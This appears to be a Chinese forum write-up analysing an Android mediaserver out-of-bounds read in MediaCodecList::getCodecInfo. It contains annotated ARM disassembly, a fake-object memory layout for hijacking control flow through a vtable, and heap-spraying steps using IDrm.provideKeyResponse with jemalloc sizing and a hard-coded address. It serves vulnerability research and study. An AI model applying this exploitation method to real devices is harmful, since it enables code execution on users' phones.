
```
//libstagefright.so

.text:000A9478 ; android::sp<android::MediaCodecInfo> __usercall android::MediaCodecList::getCodecInfo@<R0>(const android::MediaCodecList *this@<R1>, size_t index@<R2>)

.text:000A9478 return_obj = R0                         ；保存的就是上面info的地址

.text:000A9478 this = R1                               ; const android::MediaCodecList *

.text:000A9478 index = R2                              ; size_t

.text:000A9478                 PUSH.W          {R11,LR}

.text:000A947C                 MOV             R3, R0

.text:000A947E                 LDR             R0, [this,#0x5C]

.text:000A9480                 LDR.W           R0, [R0,index,LSL#2] ; 这里可以越界读取

.text:000A9484                 STR             R0, [R3]; 设置info.m_prt

.text:000A9486                 CMP             R0, #0

.text:000A9488                 ITT NE

.text:000A948A                 MOVNE           this, R3 ; 调用info的拷贝构造函数，因为inline优化直接调用了(info.m_ptr)->incStrong()

.text:000A948C                 BLXNE           _ZNK7android7RefBase9incStrongEPKv ; android::RefBase::incStrong(void const*)

.text:000A9490                 POP.W           {R11,PC}

.text:000A9490 ; End of function android::MediaCodecList::getCodecInfo(uint)

```

可以看到会将vector的内容读取到R0中，如果R0不为零，会调用incStrong, 代码如下：

```
//04fK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3q4F1k6s2u0G2K9h3c8^5M7X3g2X3i4K6u0W2j5$3!0E0i4K6u0r3y4W2)9J5k6e0m8Q4x3X3f1H3i4K6g2X3M7U0q4Q4x3V1k6^5M7X3g2X3i4K6u0r3M7%4W2K6N6r3g2E0i4K6u0r3j5$3!0J5k6g2)9J5c8X3I4A6j5Y4g2@1K9h3I4K6i4K6u0r3f1X3g2X3b7X3q4K6k6g2)9J5k6h3y4H3M7q4)9J5x3K6x3J5x3R3`.`.



void RefBase::incStrong(const void* id) const

{

    weakref_impl* const refs = mRefs;

    refs->incWeak(id);



    refs->addStrongRef(id);

    const int32_t c = android_atomic_inc(&refs->mStrong);

    ALOG_ASSERT(c > 0, "incStrong() called on %p after last strong ref", refs);

#if PRINT_REFS

    ALOGD("incStrong of %p from %p: cnt=%d\n", this, id, c);

#endif

    if (c != INITIAL_STRONG_VALUE)  {

        return;

    }



    android_atomic_add(-INITIAL_STRONG_VALUE, &refs->mStrong);

    refs->mBase->onFirstRef(); //这里有虚函数的调用

}

```

汇编代码版本，可以清楚看到存在虚函数的调用：

```
// libutils.so

.text:0000E6BE ; void __fastcall android::RefBase::incStrong(const android::RefBase *const this, const void *id)

.text:0000E6BE                 EXPORT _ZNK7android7RefBase9incStrongEPKv     

.text:0000E6BE                                         

.text:0000E6BE this = R0                                         ; const android::RefBase *const

.text:0000E6BE id = R1                                           ; const void *

.text:0000E6BE                 PUSH            {R4,LR}

.text:0000E6C0                 LDR             R4, [this,#4]     ;this存放的就是越界读取的内容

.text:0000E6C2 refs = R4                               ; android::RefBase::weakref_impl *const

.text:0000E6C2                 MOV             this, refs ; this

.text:0000E6C4                 BLX             j__ZN7android7RefBase12weakref_type7incWeakEPKv ; 

.text:0000E6C8                 DMB.W           SY

.text:0000E6CC                 LDREX.W         R3, [refs]

.text:0000E6D0                 ADDS            R2, R3, #1

.text:0000E6D2                 STREX.W         R1, R2, [refs]

.text:0000E6D6                 CMP             R1, #0

.text:0000E6D8                 BNE             loc_E6CC

.text:0000E6DA                 CMP.W           R3, #0x10000000

.text:0000E6DE                 BNE             locret_E700

.text:0000E6E0                 DMB.W           SY

.text:0000E6E4                 LDREX.W         R0, [refs]

.text:0000E6E8                 ADD.W           R12, R0, #0xF0000000

.text:0000E6EC                 STREX.W         R3, R12, [refs]

.text:0000E6F0                 CMP             R3, #0

.text:0000E6F2                 BNE             loc_E6E4

.text:0000E6F4                 LDR             R0, [refs,#8]

.text:0000E6F6                 LDR             refs, [R0]  ; vtable

.text:0000E6F8                 LDR             R2, [R4,#8] ; 可以通过这里控制pc

.text:0000E6FA                 POP.W           {R4,LR}

.text:0000E6FE                 BX              R2

```

梳理一下就是，越界读取的内容放入R0，然后进行如下操作：

```
refs = [R0 + 4]

if ([refs] == 0x10000000)

    mbase = [refs + 8]

    vtable = [mbase]

    call [vtable + 8]

```

也就是说如果我们在内存中伪造了合适的MeidaCodecInfo，并且将指向该伪造的MediaCodecInfo的指针放入vector<sp<MediaCodecInfo>>存储区的后面，这样我们就可以通过越界访问，读取到指向该伪造的MediaCodecInfo的指针，进而控制pc。我们可以在内存中伪造如下的MediaCodecInfo:

```
//BASEADDR 为假MediaCodecInfo的起始地址

*(BASEADDR) = vtale; //设置MediaCodecInfo vtable 随便填写

*((unsigned int *)BASEADDR + 1) = BASEADDR + 12;     //mRefs, 使他指向BASEADDR + 12

*((unsigned int *)BASEADDR + 3) = 0x10000000;        //mRefs指向此处，即虚假的info->mRefs的起始地址

*((unsigned int *)BASEADDR + 5) = BASEADDR + 0x20;   //info->mRefs->mBase字段，使他指向BASEADDR + 0x20

*((unsigned int*)BASEADDR + 8) = BASEADDR + 0x20 + 4;  //mBase的vtable字段，使他指向BASEADDR + 0x20 + 4

*((unsigned int*)BASEADDR + 11) = 0x61616161;          //vtable + 8, 我们可以在此处放置目标pc

```

最终poc运行成功，mediaserver运行到我们指定的位置：0x61616161

![](https://bbs.kanxue.com/upload/attach/201805/657395_77DUJ9H7J2HFMFX.jpg)

### 堆喷射的问题

要成功的运行poc实现漏洞利用的目的，要进行两次堆喷射，第一次是将我们伪造的MediaCodecInfo喷射到内存中，第二次是将我们伪造的MediaCodecInfo的地址喷射到vector<sp<MediaCodecInfo>>的存储区的后面，这样可以通过越界读取，来触发漏洞。

但是遇到了如下问题：

1.作者的poc中，硬编码了一个地址0xb3003010，就是在作者的测试机器上，作者喷射的伪造的MediaCodecInfo有很大概率会落在这个地址上。作者说之所以是0xb3003010而不是0xb3003000是因为数据前面还有0x10字节的元数据，但是我们知道jemalloc中存放数据的region和run都不包含元数据，那么这个元数据是哪里来的？

先看下是如何堆喷射的，作者使用IDrm.provideKeyResponse进行堆喷射的，服务端在拿到response后，最终会调用Session.provideKeyResponse处理：

```
typedef android::KeyedVector<android::Vector<uint8_t>,

        android::Vector<uint8_t> > KeyMap;



status_t Session::provideKeyResponse(const Vector<uint8_t>& response) {

    String8 responseString(

    reinterpret_cast<const char*>(response.array()), response.size());

    KeyMap keys;



    Mutex::Autolock lock(mMapLock);

    JsonWebKey parser;

    if (parser.extractKeysFromJsonWebKeySet(responseString, &keys)) {

        for (size_t i = 0; i < keys.size(); ++i) {

            const KeyMap::key_type& keyId = keys.keyAt(i);

            const KeyMap::value_type& key = keys.valueAt(i);

            mKeyMap.add(keyId, key);          //在这里会将payload保存到堆

        }

        return android::OK;

    } else {

        return android::ERROR_DRM_UNKNOWN;

    }

}
```

可以发现喷射的数据最终是保存在android::Vector中的，通过查看源码发现：android::Vector的数据是保存在SharedBuffer中的。0x10字节保存的就是SharedBuffer的私有变量

```
int32_t        mRefs;

size_t         mSize;

uint32_t       mReserved[2];

```

2.第一次堆喷射需要将指向伪造的MediaCodecInfo的指针喷射到vector<sp<MediaCodecInfo>>的存储区的后方，但是我在运行作者poc的时候，越界读取很少可以命中，所以就想如何可以提高命中率。

作者的方法是：vector的存储区肯定是jemalloc分配的，肯定是落在某个大小的region内，所以作者首先计算出这个大小，然后后面堆喷射时，喷射出大量相同大小的region，这样后面越界读取就有很大概率命中。所以关键是如下步骤：

- 计算vector<sp<MediaCodecInfo>>的存储区所在region大小

- 确保堆喷射时，分配的是相同大小的region

通过调试发现vector<sp<MediaCodecInfo>>的存储区所在region大小和作者中poc给的一致，但是在调试时发现喷射的payload并没有落在大小为160的region内，而是在0x100的region内。

原因就是payload在mediaserver中是保存在Vector中的，Vector在分配空间时会多分配一些，所以大小为160的payload，最终会放置在大小大于160的region中，通过调试，我把payload大小改为96就可以保证分配在160的region中。

修改后，运行poc后，内存布局如下图所示：

![](https://bbs.kanxue.com/upload/attach/201805/657395_MBTVZBB6P2ABKD5.png)

3.作者并未说明是如何找到0xb3003010这个地址的，存在这样一个地址的依据是什么呢？

查了一些关于android堆喷射的资料，都提到jemalloc相比之前的dlmalloc更脆弱些，具体表现在如下方面：

1. 堆地址中的熵较少

   - 很容易猜测到数据位置

2. 保存数据的region中没有元数据

   - dlmalloc会检查元数据的合法性

上面的堆地址熵较小表现在：32位ARM系统上的ASLR算法的实现很简单，ASLR会将所有的模块随机向下移动几页，范围在0~255页，代码如下，mmap\_rnd\_bits可以通过/proc/sys/vm/mmap\_rnd\_bits 来改变。
